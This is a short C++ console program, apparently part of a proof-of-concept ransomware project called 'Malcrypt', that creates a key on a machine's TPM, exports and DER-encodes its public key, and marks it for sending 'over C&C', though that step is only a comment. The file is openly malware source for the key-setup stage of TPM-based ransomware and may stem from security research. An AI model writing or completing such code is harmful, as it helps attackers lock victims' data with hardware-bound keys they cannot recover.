// tpm-keyextract.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define WRITE_KEY

int _tmain(int argc, _TCHAR* argv[])
{
	HRESULT status;
	PCWSTR keyName = L"MalcryptKey0";

	/* Create the key on the TPM. */
	status = TlclCreateKey(keyName);

	PBYTE pubKeyData;
	UINT32 pubKeySize;

	/* Output the public key (to exfiltrate). */
	status = TlclGetPubKey(keyName, &pubKeySize, &pubKeyData);

	PBYTE derPubKeyData;
	UINT32 derPubKeySize;

	/* Encode key in DER format. */
	status = DerEncodeKey(pubKeySize, pubKeyData, &derPubKeySize, &derPubKeyData);

	/* Send over C&C. */

	/* Optionally write DER-encoded key. */
#ifdef WRITE_KEY
	PcpToolWriteFile(L"MalcryptKey0.rsa", pubKeyData, pubKeySize);
	PcpToolWriteFile(L"MalcryptKey0.pub", derPubKeyData, derPubKeySize);
#endif

	if (!FAILED(status)) {
		ZeroAndFree((PVOID*)&pubKeyData, pubKeySize);
		pubKeySize = 0;
	}

	return status;
}

